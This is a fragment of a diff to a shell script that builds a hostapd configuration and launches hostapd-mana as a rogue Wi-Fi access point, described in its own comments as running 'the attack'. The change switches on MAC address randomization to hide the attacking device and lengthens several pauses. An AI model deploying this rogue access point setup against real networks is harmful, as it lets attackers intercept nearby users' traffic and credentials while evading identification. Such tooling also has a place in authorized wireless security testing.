@@ -33,17 +33,19 @@ echo "wpa_pairwise=TKIP CCMP" >> $config_file
 echo "wpa_passphrase=$wpa_passphrase" >> $config_file
 echo "auth_algs=3" >> $config_file
 
-## Randomize MAC for safety
-#sudo macchanger -r $interface_wlx
+sleep 5
+
+#Randomize MAC for safety
+sudo macchanger -r $interface_wlx
 
 #pause
-sleep 3
+sleep 5
 
 # Get the interface up and ready
 sudo ifconfig $interface_wlx up
 
 #pause
-sleep 3
+sleep 5
 
 # Run the attack for the specified duration
 sudo /home/$real_user/src/hostapd-mana/hostapd/hostapd -i $interface_wlx $config_file &
